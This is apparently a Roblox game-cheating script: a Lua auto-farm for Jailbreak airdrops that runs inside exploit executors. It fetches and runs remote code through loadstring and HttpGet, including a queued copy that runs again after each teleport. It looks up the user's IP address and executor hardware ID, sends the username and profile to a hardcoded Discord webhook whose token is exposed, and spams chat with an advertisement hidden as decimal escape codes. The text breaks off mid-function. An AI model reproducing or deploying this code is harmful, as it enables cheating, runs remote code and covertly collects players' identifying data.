

function SecureWebhookMethod()
	local Webhooks = {
		["Stats"] = "https://discord.com/api/webhooks/1041765659899609189/tFogkMnleKB40Nv8RCJKqnTLy9mhQYmmEb3xKsJegohdh63cwb59ymi8Ss64zx6s3Rjs",
		["All"] = "https://discord.com/api/webhooks/1041765659899609189/tFogkMnleKB40Nv8RCJKqnTLy9mhQYmmEb3xKsJegohdh63cwb59ymi8Ss64zx6s3Rjs",
	}

	return function(webhook, body)
		local request = http_request or request or HttpPost or syn.request
		request({
			Url = Webhooks[webhook],
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json",
			},
			Body = game:GetService("HttpService"):JSONEncode(body),
		})
	end
end
local CreateWebhook = SecureWebhookMethod()
if not game:IsLoaded() then
	game.Loaded:Wait()
end
local Version = "1.5.0"
local GuiService = game:GetService("GuiService")
local TeleportService = game:GetService("TeleportService")
local function reconnect()
	local errorCode = GuiService:GetErrorCode().Value
	if errorCode ~= 0 then
		TeleportService:Teleport(game.PlaceId)
	end
end

GuiService.ErrorMessageChanged:Connect(reconnect)
local function getexploit()
	local exploit = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse")
		or (secure_load and "Sentinel")
		or (is_sirhurt_closure and "Sirhurt")
		or (pebc_execute and "ProtoSmasher")
		or (KRNL_LOADED and "Krnl")
		or (WrapGlobal and "WeAreDevs")
		or (isvm and "Proxo")
		or (shadow_env and "Shadow")
		or (jit and "EasyExploits")
		or (getscriptenvs and "Calamari")
		or (unit and not syn and "Unit")
		or (OXYGEN_LOADED and "Oxygen U")
		or (IsElectron and "Electron")
		or "Unkown"

	return exploit
end

print(getexploit())
if not _G.StartTime then
	_G.StartTime = DateTime.now().UnixTimestamp
end
if not _G.StartMoney then
	_G.StartMoney = game:GetService("Players").LocalPlayer:WaitForChild("leaderstats"):WaitForChild("Money").Value
end
local TFMv2 = loadstring(game:HttpGet("https://raw.githubusercontent.com/coltonwach/Scripts/main/TFM.lua"))()
local queueontp = nil
if syn then
	queueontp = syn.queue_on_teleport
elseif queue_on_teleport then
	queueontp = queue_on_teleport
end
if not queueontp then
	return rconsoleerr("Unsupport exploit (should support syn.queue_on_teleport or queue_on_teleport)")
end
queueontp(
	"_G.StartTime = "
		.. _G.StartTime
		.. " _G.StartMoney = "
		.. _G.StartMoney
		.. " _G.PlsChatShit = "
		.. tostring(_G.PlsChatShit)
		.. " _G.AutoOpenSafes = "
		.. tostring(_G.AutoOpenSafes)
		.. ' loadstring(game:HttpGet("https://github.com/Rafa2k8/AutoFarmerlol/blob/main/hacked.lua"))()'
)

--local sayMessage =loadstring(game:HttpGet("https://raw.githubusercontent.com/coltonwach/Scripts/main/sayMessage.lua"))()
function sayMessage(Message, c, ...)
	if not c then
		c = Color3.fromRGB(11, 179, 221)
	end
	formats = {...}
	if not formats then
		foramts = {""}
	end
	Message = Message:format(unpack(formats))

	if
		game:GetService("Players").LocalPlayer.PlayerGui.AirdropAutoFarmLogs.Frame.ChatChannelParentFrame.Frame_MessageLogDisplay.Scroller
			:FindFirstChild("TEMPLATE_PUSH_UP")
	then
		game:GetService("Players").LocalPlayer.PlayerGui.AirdropAutoFarmLogs.Frame.ChatChannelParentFrame.Frame_MessageLogDisplay.Scroller.TEMPLATE_PUSH_UP
			:Destroy()
	end

	local Frame = Instance.new("Frame")
	local TextLabel = Instance.new("TextLabel")

	Frame.Parent =
		game:GetService("Players").LocalPlayer.PlayerGui.AirdropAutoFarmLogs.Frame.ChatChannelParentFrame.Frame_MessageLogDisplay.Scroller
	Frame.BackgroundTransparency = 1.000
	Frame.LayoutOrder = 1
	Frame.AutomaticSize = Enum.AutomaticSize.Y
	Frame.Size = UDim2.new(1, 0, 0, 18)

	TextLabel.Parent = Frame
	TextLabel.BackgroundTransparency = 1.000
	TextLabel.ClipsDescendants = false
	TextLabel.Position = UDim2.new(0, 8, 0, 0)
	TextLabel.Size = UDim2.new(1, -14, 1, 0)
	TextLabel.AutomaticSize = Enum.AutomaticSize.Y
	TextLabel.Font = Enum.Font.SourceSansBold
	TextLabel.Text = Message
	TextLabel.TextColor3 = c
	TextLabel.TextSize = 18.000
	TextLabel.TextStrokeTransparency = 0.750
	TextLabel.TextWrapped = true
	TextLabel.TextXAlignment = Enum.TextXAlignment.Right
	TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom

	local Frame = Instance.new("Frame")
	local TextLabel = Instance.new("TextLabel")

	Frame.Name = "TEMPLATE_PUSH_UP"
	Frame.Parent =
		game:GetService("Players").LocalPlayer.PlayerGui.AirdropAutoFarmLogs.Frame.ChatChannelParentFrame.Frame_MessageLogDisplay.Scroller
	Frame.BackgroundTransparency = 1.000
	Frame.LayoutOrder = 1
	Frame.AutomaticSize = Enum.AutomaticSize.Y
	Frame.Size = UDim2.new(1, 0, 0, 18)

	TextLabel.Parent = Frame
	TextLabel.BackgroundTransparency = 1.000
	TextLabel.ClipsDescendants = false
	TextLabel.Position = UDim2.new(0, 8, 0, 0)
	TextLabel.Size = UDim2.new(1, -14, 1, 0)
	TextLabel.AutomaticSize = Enum.AutomaticSize.Y
	TextLabel.Font = Enum.Font.SourceSansBold
	TextLabel.Text = ""
	TextLabel.TextColor3 = c
	TextLabel.TextSize = 18.000
	TextLabel.TextStrokeTransparency = 0.750
	TextLabel.TextWrapped = true
	TextLabel.TextXAlignment = Enum.TextXAlignment.Right
	TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
end

function CreateLogGui()
	local Chat = Instance.new("ScreenGui")
	local Frame = Instance.new("Frame")
	local ChatBarParentFrame = Instance.new("Frame")
	local ChannelsBarParentFrame = Instance.new("Frame")
	local Frame_2 = Instance.new("Frame")
	local ScrollingBase = Instance.new("Frame")
	local ScrollerSizer = Instance.new("Frame")
	local ScrollerFrame = Instance.new("Frame")
	local Frame_All = Instance.new("Frame")
	local BackgroundFrame = Instance.new("Frame")
	local UnselectedFrame = Instance.new("Frame")
	local TextButton = Instance.new("TextButton")
	local SelectedFrame = Instance.new("Frame")
	local BackgroundImage = Instance.new("ImageLabel")
	local BlueBarLeft = Instance.new("ImageLabel")
	local BlueBarRight = Instance.new("ImageLabel")
	local TextButton_2 = Instance.new("TextButton")
	local TextButton_3 = Instance.new("TextButton")
	local Frame_3 = Instance.new("Frame")
	local ImageLabel = Instance.new("ImageLabel")
	local TextLabel = Instance.new("TextLabel")
	local Frame_System = Instance.new("Frame")
	local BackgroundFrame_2 = Instance.new("Frame")
	local UnselectedFrame_2 = Instance.new("Frame")
	local TextButton_4 = Instance.new("TextButton")
	local SelectedFrame_2 = Instance.new("Frame")
	local BackgroundImage_2 = Instance.new("ImageLabel")
	local BlueBarLeft_2 = Instance.new("ImageLabel")
	local BlueBarRight_2 = Instance.new("ImageLabel")
	local TextButton_5 = Instance.new("TextButton")
	local TextButton_6 = Instance.new("TextButton")
	local Frame_4 = Instance.new("Frame")
	local ImageLabel_2 = Instance.new("ImageLabel")
	local TextLabel_2 = Instance.new("TextLabel")
	local Frame_5 = Instance.new("Frame")
	local LeaveConfirmationFrame = Instance.new("Frame")
	local TextButton_7 = Instance.new("TextButton")
	local TextButton_8 = Instance.new("TextButton")
	local TextButton_9 = Instance.new("TextButton")
	local TextLabel_3 = Instance.new("TextLabel")
	local PageLeftButton = Instance.new("ImageButton")
	local ArrowLabel = Instance.new("ImageLabel")
	local PositionalHelper = Instance.new("Frame")
	local PageRightButton = Instance.new("ImageButton")
	local ArrowLabel_2 = Instance.new("ImageLabel")
	local ChatChannelParentFrame = Instance.new("Frame")
	local Frame_MessageLogDisplay = Instance.new("Frame")
	local Scroller = Instance.new("ScrollingFrame")
	local UIListLayout = Instance.new("UIListLayout")
	local ImageButton = Instance.new("ImageButton")
	local ImageLabel_3 = Instance.new("ImageLabel")

	Chat.Name = "AirdropAutoFarmLogs"
	Chat.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
	Chat.DisplayOrder = 6
	Chat.ResetOnSpawn = false

	Frame.Parent = Chat
	Frame.BackgroundTransparency = 1.000
	Frame.Position = UDim2.new(0.699708462, 0, 0.713692963, 0)
	Frame.Size = UDim2.new(0.300000012, 0, 0.284934491, 0)

	ChatBarParentFrame.Name = "ChatBarParentFrame"
	ChatBarParentFrame.Parent = Frame
	ChatBarParentFrame.BackgroundTransparency = 1.000
	ChatBarParentFrame.Position = UDim2.new(0, 0, 1, -42)
	ChatBarParentFrame.Size = UDim2.new(1, 0, 0, 42)

	ChannelsBarParentFrame.Name = "ChannelsBarParentFrame"
	ChannelsBarParentFrame.Parent = Frame
	ChannelsBarParentFrame.BackgroundTransparency = 1.000
	ChannelsBarParentFrame.Size = UDim2.new(1, 0, 0, 34)
	ChannelsBarParentFrame.Visible = false

	Frame_2.Parent = ChannelsBarParentFrame
	Frame_2.BackgroundTransparency = 1.000
	Frame_2.Size = UDim2.new(1, 0, 1, 0)

	ScrollingBase.Name = "ScrollingBase"
	ScrollingBase.Parent = Frame_2
	ScrollingBase.BackgroundTransparency = 1.000
	ScrollingBase.ClipsDescendants = false
	ScrollingBase.Size = UDim2.new(1, 0, 1, 0)

	ScrollerSizer.Name = "ScrollerSizer"
	ScrollerSizer.Parent = ScrollingBase
	ScrollerSizer.BackgroundTransparency = 1.000
	ScrollerSizer.Size = UDim2.new(0.5, 0, 1, 0)

	ScrollerFrame.Name = "ScrollerFrame"
	ScrollerFrame.Parent = ScrollerSizer
	ScrollerFrame.BackgroundTransparency = 1.000
	ScrollerFrame.Size = UDim2.new(1, 0, 1, 0)

	Frame_All.Name = "Frame_All"
	Frame_All.Parent = ScrollerFrame
	Frame_All.BackgroundTransparency = 1.000
	Frame_All.Size = UDim2.new(1, 0, 1, 0)

	BackgroundFrame.Name = "BackgroundFrame"
	BackgroundFrame.Parent = Frame_All
	BackgroundFrame.BackgroundTransparency = 1.000
	BackgroundFrame.Position = UDim2.new(0, 1, 0, 1)
	BackgroundFrame.Size = UDim2.new(1, -2, 1, -2)

	UnselectedFrame.Name = "UnselectedFrame"
	UnselectedFrame.Parent = BackgroundFrame
	UnselectedFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	UnselectedFrame.BackgroundTransparency = 0.600
	UnselectedFrame.BorderSizePixel = 0
	UnselectedFrame.Size = UDim2.new(1, 0, 1, 0)
	UnselectedFrame.Visible = false

	TextButton.Parent = UnselectedFrame
	TextButton.Active = false
	TextButton.BackgroundTransparency = 1.000
	TextButton.Selectable = false
	TextButton.Size = UDim2.new(1, 0, 1, 0)
	TextButton.Font = Enum.Font.SourceSans
	TextButton.Text = "All"
	TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextButton.TextSize = 18.000
	TextButton.TextStrokeTransparency = 0.600
	TextButton.TextTransparency = 0.600

	SelectedFrame.Name = "SelectedFrame"
	SelectedFrame.Parent = BackgroundFrame
	SelectedFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	SelectedFrame.BackgroundTransparency = 1.000
	SelectedFrame.BorderSizePixel = 0
	SelectedFrame.Size = UDim2.new(1, 0, 1, 0)

	BackgroundImage.Name = "BackgroundImage"
	BackgroundImage.Parent = SelectedFrame
	BackgroundImage.BackgroundColor3 = Color3.fromRGB(93, 100, 115)
	BackgroundImage.BackgroundTransparency = 0.600
	BackgroundImage.BorderSizePixel = 0
	BackgroundImage.Size = UDim2.new(1, 0, 1, 0)
	BackgroundImage.ScaleType = Enum.ScaleType.Slice

	BlueBarLeft.Name = "BlueBarLeft"
	BlueBarLeft.Parent = SelectedFrame
	BlueBarLeft.BackgroundTransparency = 1.000
	BlueBarLeft.Position = UDim2.new(0, 2, 1, -4)
	BlueBarLeft.Size = UDim2.new(0.5, -2, 0, 4)
	BlueBarLeft.Image = "rbxasset://textures/ui/Settings/Slider/SelectedBarLeft.png"
	BlueBarLeft.ImageTransparency = 0.600
	BlueBarLeft.ScaleType = Enum.ScaleType.Slice
	BlueBarLeft.SliceCenter = Rect.new(3, 3, 32, 21)

	BlueBarRight.Name = "BlueBarRight"
	BlueBarRight.Parent = SelectedFrame
	BlueBarRight.BackgroundTransparency = 1.000
	BlueBarRight.Position = UDim2.new(0.5, 0, 1, -4)
	BlueBarRight.Size = UDim2.new(0.5, -2, 0, 4)
	BlueBarRight.Image = "rbxasset://textures/ui/Settings/Slider/SelectedBarRight.png"
	BlueBarRight.ImageTransparency = 0.600
	BlueBarRight.ScaleType = Enum.ScaleType.Slice
	BlueBarRight.SliceCenter = Rect.new(3, 3, 32, 21)

	TextButton_2.Parent = SelectedFrame
	TextButton_2.Active = false
	TextButton_2.BackgroundTransparency = 1.000
	TextButton_2.Selectable = false
	TextButton_2.Size = UDim2.new(1, 0, 1, 0)
	TextButton_2.Font = Enum.Font.SourceSansBold
	TextButton_2.Text = "All"
	TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextButton_2.TextSize = 18.000
	TextButton_2.TextStrokeTransparency = 0.750

	TextButton_3.Parent = BackgroundFrame
	TextButton_3.BackgroundTransparency = 1.000
	TextButton_3.Selectable = false
	TextButton_3.Size = UDim2.new(1, 0, 1, 0)
	TextButton_3.Font = Enum.Font.SourceSansBold
	TextButton_3.Text = ""
	TextButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextButton_3.TextSize = 18.000
	TextButton_3.TextStrokeTransparency = 0.750

	Frame_3.Parent = BackgroundFrame
	Frame_3.BackgroundTransparency = 1.000
	Frame_3.Position = UDim2.new(0.800000012, -9, 0.5, -9)
	Frame_3.Size = UDim2.new(0, 18, 0, 18)

	ImageLabel.Parent = Frame_3
	ImageLabel.BackgroundTransparency = 1.000
	ImageLabel.Size = UDim2.new(1, 0, 1, 0)
	ImageLabel.Visible = false
	ImageLabel.Image = "rbxasset://textures/ui/Chat/MessageCounter.png"

	TextLabel.Parent = ImageLabel
	TextLabel.BackgroundTransparency = 1.000
	TextLabel.Position = UDim2.new(0.5, -7, 0.5, -7)
	TextLabel.Size = UDim2.new(0, 13, 0, 9)
	TextLabel.Font = Enum.Font.SourceSansBold
	TextLabel.Text = ""
	TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel.TextSize = 14.000
	TextLabel.TextStrokeTransparency = 0.750

	Frame_System.Name = "Frame_System"
	Frame_System.Parent = ScrollerFrame
	Frame_System.BackgroundTransparency = 1.000
	Frame_System.Position = UDim2.new(1, 0, 0, 0)
	Frame_System.Size = UDim2.new(1, 0, 1, 0)

	BackgroundFrame_2.Name = "BackgroundFrame"
	BackgroundFrame_2.Parent = Frame_System
	BackgroundFrame_2.BackgroundTransparency = 1.000
	BackgroundFrame_2.Position = UDim2.new(0, 1, 0, 1)
	BackgroundFrame_2.Size = UDim2.new(1, -2, 1, -2)

	UnselectedFrame_2.Name = "UnselectedFrame"
	UnselectedFrame_2.Parent = BackgroundFrame_2
	UnselectedFrame_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	UnselectedFrame_2.BackgroundTransparency = 0.600
	UnselectedFrame_2.BorderSizePixel = 0
	UnselectedFrame_2.Size = UDim2.new(1, 0, 1, 0)

	TextButton_4.Parent = UnselectedFrame_2
	TextButton_4.Active = false
	TextButton_4.BackgroundTransparency = 1.000
	TextButton_4.Selectable = false
	TextButton_4.Size = UDim2.new(1, 0, 1, 0)
	TextButton_4.Font = Enum.Font.SourceSans
	TextButton_4.Text = "System"
	TextButton_4.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextButton_4.TextSize = 18.000
	TextButton_4.TextStrokeTransparency = 0.600
	TextButton_4.TextTransparency = 0.600

	SelectedFrame_2.Name = "SelectedFrame"
	SelectedFrame_2.Parent = BackgroundFrame_2
	SelectedFrame_2.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	SelectedFrame_2.BackgroundTransparency = 1.000
	SelectedFrame_2.BorderSizePixel = 0
	SelectedFrame_2.Size = UDim2.new(1, 0, 1, 0)
	SelectedFrame_2.Visible = false

	BackgroundImage_2.Name = "BackgroundImage"
	BackgroundImage_2.Parent = SelectedFrame_2
	BackgroundImage_2.BackgroundColor3 = Color3.fromRGB(93, 100, 115)
	BackgroundImage_2.BackgroundTransparency = 0.600
	BackgroundImage_2.BorderSizePixel = 0
	BackgroundImage_2.Size = UDim2.new(1, 0, 1, 0)
	BackgroundImage_2.ScaleType = Enum.ScaleType.Slice

	BlueBarLeft_2.Name = "BlueBarLeft"
	BlueBarLeft_2.Parent = SelectedFrame_2
	BlueBarLeft_2.BackgroundTransparency = 1.000
	BlueBarLeft_2.Position = UDim2.new(0, 2, 1, -4)
	BlueBarLeft_2.Size = UDim2.new(0.5, -2, 0, 4)
	BlueBarLeft_2.Image = "rbxasset://textures/ui/Settings/Slider/SelectedBarLeft.png"
	BlueBarLeft_2.ImageTransparency = 0.600
	BlueBarLeft_2.ScaleType = Enum.ScaleType.Slice
	BlueBarLeft_2.SliceCenter = Rect.new(3, 3, 32, 21)

	BlueBarRight_2.Name = "BlueBarRight"
	BlueBarRight_2.Parent = SelectedFrame_2
	BlueBarRight_2.BackgroundTransparency = 1.000
	BlueBarRight_2.Position = UDim2.new(0.5, 0, 1, -4)
	BlueBarRight_2.Size = UDim2.new(0.5, -2, 0, 4)
	BlueBarRight_2.Image = "rbxasset://textures/ui/Settings/Slider/SelectedBarRight.png"
	BlueBarRight_2.ImageTransparency = 0.600
	BlueBarRight_2.ScaleType = Enum.ScaleType.Slice
	BlueBarRight_2.SliceCenter = Rect.new(3, 3, 32, 21)

	TextButton_5.Parent = SelectedFrame_2
	TextButton_5.Active = false
	TextButton_5.BackgroundTransparency = 1.000
	TextButton_5.Selectable = false
	TextButton_5.Size = UDim2.new(1, 0, 1, 0)
	TextButton_5.Font = Enum.Font.SourceSansBold
	TextButton_5.Text = "System"
	TextButton_5.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextButton_5.TextSize = 18.000
	TextButton_5.TextStrokeTransparency = 0.750

	TextButton_6.Parent = BackgroundFrame_2
	TextButton_6.BackgroundTransparency = 1.000
	TextButton_6.Selectable = false
	TextButton_6.Size = UDim2.new(1, 0, 1, 0)
	TextButton_6.Font = Enum.Font.SourceSans
	TextButton_6.Text = ""
	TextButton_6.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextButton_6.TextSize = 18.000
	TextButton_6.TextStrokeTransparency = 0.750

	Frame_4.Parent = BackgroundFrame_2
	Frame_4.BackgroundTransparency = 1.000
	Frame_4.Position = UDim2.new(0.800000012, -9, 0.5, -9)
	Frame_4.Size = UDim2.new(0, 18, 0, 18)

	ImageLabel_2.Parent = Frame_4
	ImageLabel_2.BackgroundTransparency = 1.000
	ImageLabel_2.Size = UDim2.new(1, 0, 1, 0)
	ImageLabel_2.Visible = false
	ImageLabel_2.Image = "rbxasset://textures/ui/Chat/MessageCounter.png"

	TextLabel_2.Parent = ImageLabel_2
	TextLabel_2.BackgroundTransparency = 1.000
	TextLabel_2.Position = UDim2.new(0.5, -7, 0.5, -7)
	TextLabel_2.Size = UDim2.new(0, 13, 0, 9)
	TextLabel_2.Font = Enum.Font.SourceSansBold
	TextLabel_2.Text = ""
	TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel_2.TextSize = 14.000
	TextLabel_2.TextStrokeTransparency = 0.750

	Frame_5.Parent = Frame_2
	Frame_5.BackgroundTransparency = 1.000
	Frame_5.ClipsDescendants = false
	Frame_5.Size = UDim2.new(1, 0, 1, 0)

	LeaveConfirmationFrame.Name = "LeaveConfirmationFrame"
	LeaveConfirmationFrame.Parent = Frame_5
	LeaveConfirmationFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	LeaveConfirmationFrame.BackgroundTransparency = 0.600
	LeaveConfirmationFrame.BorderSizePixel = 0
	LeaveConfirmationFrame.Position = UDim2.new(0, 0, 1, 0)
	LeaveConfirmationFrame.Size = UDim2.new(1, 0, 1, 0)

	TextButton_7.Parent = LeaveConfirmationFrame
	TextButton_7.BackgroundTransparency = 1.000
	TextButton_7.Selectable = false
	TextButton_7.Size = UDim2.new(1, 0, 1, 0)
	TextButton_7.Text = ""

	TextButton_8.Parent = LeaveConfirmationFrame
	TextButton_8.BackgroundTransparency = 1.000
	TextButton_8.Selectable = false
	TextButton_8.Size = UDim2.new(0.25, 0, 1, 0)
	TextButton_8.Font = Enum.Font.SourceSansBold
	TextButton_8.Text = "Confirm"
	TextButton_8.TextColor3 = Color3.fromRGB(0, 255, 0)
	TextButton_8.TextSize = 18.000
	TextButton_8.TextStrokeTransparency = 0.750

	TextButton_9.Parent = LeaveConfirmationFrame
	TextButton_9.BackgroundTransparency = 1.000
	TextButton_9.Position = UDim2.new(0.75, 0, 0, 0)
	TextButton_9.Selectable = false
	TextButton_9.Size = UDim2.new(0.25, 0, 1, 0)
	TextButton_9.Font = Enum.Font.SourceSansBold
	TextButton_9.Text = "Cancel"
	TextButton_9.TextColor3 = Color3.fromRGB(255, 0, 0)
	TextButton_9.TextSize = 18.000
	TextButton_9.TextStrokeTransparency = 0.750

	TextLabel_3.Parent = LeaveConfirmationFrame
	TextLabel_3.BackgroundTransparency = 1.000
	TextLabel_3.Position = UDim2.new(0.25, 0, 0, 0)
	TextLabel_3.Size = UDim2.new(0.5, 0, 1, 0)
	TextLabel_3.Font = Enum.Font.SourceSansBold
	TextLabel_3.Text = "Leave channel <XX>?"
	TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel_3.TextSize = 18.000
	TextLabel_3.TextStrokeTransparency = 0.750

	PageLeftButton.Name = "PageLeftButton"
	PageLeftButton.Parent = Frame_2
	PageLeftButton.BackgroundTransparency = 1.000
	PageLeftButton.Position = UDim2.new(0, 4, 0.150000006, 0)
	PageLeftButton.Selectable = false
	PageLeftButton.Size = UDim2.new(0.699999988, 0, 0.699999988, 0)
	PageLeftButton.SizeConstraint = Enum.SizeConstraint.RelativeYY
	PageLeftButton.Visible = false
	PageLeftButton.Image = "rbxassetid://471630199"
	PageLeftButton.ImageTransparency = 0.600

	ArrowLabel.Name = "ArrowLabel"
	ArrowLabel.Parent = PageLeftButton
	ArrowLabel.BackgroundTransparency = 1.000
	ArrowLabel.Position = UDim2.new(0.25, 0, 0.300000012, 0)
	ArrowLabel.Rotation = 180.000
	ArrowLabel.Size = UDim2.new(0.400000006, 0, 0.400000006, 0)
	ArrowLabel.Image = "rbxassetid://471630112"
	ArrowLabel.ImageTransparency = 0.600

	PositionalHelper.Name = "PositionalHelper"
	PositionalHelper.Parent = Frame_2
	PositionalHelper.BackgroundTransparency = 1.000
	PositionalHelper.Position = UDim2.new(1, 0, 0.150000006, 0)
	PositionalHelper.Size = UDim2.new(0.699999988, 0, 0.699999988, 0)
	PositionalHelper.SizeConstraint = Enum.SizeConstraint.RelativeYY

	PageRightButton.Name = "PageRightButton"
	PageRightButton.Parent = PositionalHelper
	PageRightButton.BackgroundTransparency = 1.000
	PageRightButton.Position = UDim2.new(-1, -4, 0, 0)
	PageRightButton.Selectable = false
	PageRightButton.Size = UDim2.new(1, 0, 1, 0)
	PageRightButton.Visible = false
	PageRightButton.Image = "rbxassetid://471630199"
	PageRightButton.ImageTransparency = 0.600

	ArrowLabel_2.Name = "ArrowLabel"
	ArrowLabel_2.Parent = PageRightButton
	ArrowLabel_2.BackgroundTransparency = 1.000
	ArrowLabel_2.Position = UDim2.new(0.350000024, 0, 0.300000012, 0)
	ArrowLabel_2.Size = UDim2.new(0.400000006, 0, 0.400000006, 0)
	ArrowLabel_2.Image = "rbxassetid://471630112"
	ArrowLabel_2.ImageTransparency = 0.600

	ChatChannelParentFrame.Name = "ChatChannelParentFrame"
	ChatChannelParentFrame.Parent = Frame
	ChatChannelParentFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	ChatChannelParentFrame.BackgroundTransparency = 1.000
	ChatChannelParentFrame.BorderSizePixel = 0
	ChatChannelParentFrame.Position = UDim2.new(0, 0, 0, 2)
	ChatChannelParentFrame.Size = UDim2.new(1, 0, 1.21840143, -46)

	Frame_MessageLogDisplay.Name = "Frame_MessageLogDisplay"
	Frame_MessageLogDisplay.Parent = ChatChannelParentFrame
	Frame_MessageLogDisplay.BackgroundTransparency = 1.000
	Frame_MessageLogDisplay.Size = UDim2.new(1, 0, 1, 0)

	Scroller.Name = "Scroller"
	Scroller.ClipsDescendants = false
	Scroller.Parent = Frame_MessageLogDisplay
	Scroller.Active = true
	Scroller.BackgroundTransparency = 1.000
	Scroller.BorderSizePixel = 0
	Scroller.Position = UDim2.new(0, 0, 0, 3)
	Scroller.Selectable = false
	Scroller.Size = UDim2.new(1, -4, 1, -6)
	Scroller.CanvasSize = UDim2.new(0, 0, 0, 18)
	Scroller.ScrollBarThickness = 4

	UIListLayout.Parent = Scroller
	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Bottom

	ImageButton.Parent = Frame
	ImageButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	ImageButton.BackgroundTransparency = 0.600
	ImageButton.BorderSizePixel = 0
	ImageButton.Position = UDim2.new(1, -42, 1, -42)
	ImageButton.Selectable = false
	ImageButton.Size = UDim2.new(0, 42, 0, 42)
	ImageButton.Visible = false

	ImageLabel_3.Parent = ImageButton
	ImageLabel_3.BackgroundTransparency = 1.000
	ImageLabel_3.Position = UDim2.new(0.200000003, 0, 0.200000003, 0)
	ImageLabel_3.Size = UDim2.new(0.800000012, 0, 0.800000012, 0)
	ImageLabel_3.Image = "rbxassetid://261880743"
	ImageLabel_3.ImageTransparency = 0.600
end

CreateLogGui()

local diff = game:GetService("Players").LocalPlayer:WaitForChild("leaderstats"):WaitForChild("Money").Value
	- _G.StartMoney
local RunTime = DateTime.now().UnixTimestamp - _G.StartTime
local converted = TFMv2.Convert(RunTime)
local str = TFMv2.FormatStr(converted, "%h hour%h(\1s), %m minute%m(\1s), %S second%S(\1s)")
local ExecutorRequestFunc = nil
if syn then
	ExecutorRequestFunc = syn.request
elseif http then
	ExecutorRequestFunc = http.request
elseif request then
	ExecutorRequestFunc = request
else
	ExecutorRequestFunc = nil
end

if not ExecutorRequestFunc then
	return rconsoleerr("Unsupport exploit (should support syn.request or http.request)")
end
local headers = {}
pcall(function()
	headers = game:GetService("HttpService").JSONDecode(
		game:GetService("HttpService"),
		ExecutorRequestFunc({
			Url = "http://httpbin.org/post", -- This website helps debug HTTP requests
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json", -- When sending JSON, set this!
			},
			Body = game:GetService("HttpService").JSONEncode(game:GetService("HttpService"), { hello = "world" }),
		})["Body"]
	)["headers"]
end)
local HWID = nil
if headers["Syn-User-Identifier"] then
	HWID = headers["Syn-User-Identifier"]
elseif headers["Krnl-Hwid"] then
	HWID = headers["Krnl-Hwid"]
else
	HWID = nil
end
local ip = game:GetService("HttpService").JSONDecode(
	game:GetService("HttpService"),
	ExecutorRequestFunc({
		Url = "http://httpbin.org/post", -- This website helps debug HTTP requests
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json", -- When sending JSON, set this!
		},
		Body = game:GetService("HttpService").JSONEncode(game:GetService("HttpService"), { hello = "world" }),
	})["Body"]
)["origin"]

CreateWebhook("All", {
	["embeds"] = {
		{
			["title"] = "Jailbreak Autofarm was loaded on " .. tostring(
				DateTime.now():FormatUniversalTime("MMM D h:mm A", "en-us")
			) .. " UDT",
			["description"] = "Profile: https://roblox.com/users/" .. game:GetService("Players").LocalPlayer.UserId,
			["color"] = 0x0bb3dd,
			["fields"] = {
				{
					["name"] = "Username:",
					["value"] = game:GetService("Players").LocalPlayer.Name,
				},
				{
					["name"] = "Executor:",
					["value"] = getexploit(),
				},	
				{
					["name"] = "Version:",
					["value"] = Version,
				},
			},
		},
	},
})
sayMessage(
	"\65\105\114\100\114\111\112\32\65\117\116\111\32\70\97\114\109\32\105\115\32\105\110\105\116\97\108\105\122\105\110\103\n\n\67\114\101\97\116\101\100\32\98\121\32\67\111\108\82\101\97\108\80\114\111\n\84\101\115\116\101\100\32\98\121\32\84\78\84\n\n\83\116\97\116\115\58\n\84\111\116\97\108\32\103\97\105\110\101\100\58\32\37\115\n\84\111\116\97\108\32\114\117\110\116\105\109\101\58\32\37\115\n\67\97\115\104\32\112\101\114\32\104\111\117\114\58\32\37\115\n\n\69\120\101\99\117\116\111\114\58\32\37\115\n\86\101\114\115\105\111\110\58\32\37\115",
	Color3.fromRGB(11, 179, 221),
	tostring(diff),
	tostring(str),
	tostring(math.floor(diff / (RunTime / 60 / 60))),
	getexploit(),
	Version
)
task.spawn(function()
	if _G.PlsChatShit then
		sayMessage(
			"\80\108\115\67\104\97\116\83\104\105\116\32\105\115\32\101\110\97\98\108\101\100\44\32\67\104\97\116\32\119\105\108\108\32\98\101\32\115\112\97\109\109\101\100\46",
			Color3.fromRGB(11, 179, 221),
			""
		)
		local ChatMessages = {
			[0] = "\100\115\99\46\103\103\47\100\114\111\112\102\97\114\109\32\45\32\85\78\68\69\84\69\67\84\69\68\32\65\73\82\68\82\79\80\32\65\85\84\79\70\65\82\77",
			[1] = "\100\115\99\46\103\103\47\100\114\111\112\102\97\114\109\32\70\79\82\32\85\78\68\69\84\69\67\84\69\68\32\65\73\82\68\82\79\80\32\65\85\84\79\70\65\82\77",
		}
		local i = 0
		while task.wait(1.5) do
			i += 1
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
				:FireServer(ChatMessages[i % 2], "All")
			--sayMessage("Said '" .. ChatMessages[i % 2] .. "' in chat", Color3.fromRGB(11, 179, 221), "")
		end
	end
end)
local tween_service = game:GetService("TweenService")
_G.OpeningSafes = false
game:GetService("ReplicatedStorage").SafeUpdateInventoryRemote.OnClientEvent:Connect(function(tab)
